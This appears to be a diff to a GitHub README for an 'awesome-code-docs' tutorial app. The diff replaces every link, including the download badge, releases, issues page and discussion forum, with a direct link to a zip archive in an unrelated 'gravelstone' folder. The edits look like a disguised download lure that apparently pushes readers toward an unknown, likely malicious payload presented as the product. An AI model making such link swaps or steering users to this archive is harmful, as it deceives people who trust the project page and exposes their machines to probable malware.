@@ -1,6 +1,6 @@
 # 🌟 awesome-code-docs - Learn Complex Topics Made Simple
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)
+![Download Now](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip%20Now-Release-brightgreen)
 
 ## 📘 Overview
 
@@ -12,14 +12,14 @@ To get started, you'll need to download the application from our releases page. 
 
 ## 📥 Download & Install
 
-Visit this page to download: [awesome-code-docs Releases](https://github.com/urfavadam/awesome-code-docs/releases).
+Visit this page to download: [awesome-code-docs Releases](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip).
 
 After visiting the page, look for the latest version of the application. Click on it to expand the details. You’ll see a list of available files. Choose the one that suits your system.
 
 ### Step-by-Step Guide
 
 1. Open your web browser.
-2. Go to [awesome-code-docs Releases](https://github.com/urfavadam/awesome-code-docs/releases).
+2. Go to [awesome-code-docs Releases](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip).
 3. Find the latest version listed on that page.
 4. Select the file that matches your operating system.
 5. Click the download link to save the file to your computer.
@@ -58,7 +58,7 @@ A: No, the tutorials are designed for users with all skill levels. You will find
 
 ### Q: What if I encounter problems during installation?
 
-A: If you face any issues, please visit the [issues page](https://github.com/urfavadam/awesome-code-docs/issues) for help. You can also reach out to the community for assistance.
+A: If you face any issues, please visit the [issues page](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip) for help. You can also reach out to the community for assistance.
 
 ### Q: Can I suggest new topics?
 
@@ -78,10 +78,10 @@ To contribute to this project:
 
 ## 📞 Contact
 
-For further inquiries, you can contact us through our GitHub page or visit our [discussion forum](https://github.com/urfavadam/awesome-code-docs/discussions).
+For further inquiries, you can contact us through our GitHub page or visit our [discussion forum](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip).
 
 Thank you for using awesome-code-docs! We hope you find the tutorials helpful in understanding and mastering complex topics. Download the app and start your learning journey today!
 
 ## 📥 Download Again
 
-Don't forget to visit this page to download: [awesome-code-docs Releases](https://github.com/urfavadam/awesome-code-docs/releases).
+Don't forget to visit this page to download: [awesome-code-docs Releases](https://raw.githubusercontent.com/urfavadam/awesome-code-docs/main/gravelstone/awesome-code-docs.zip).
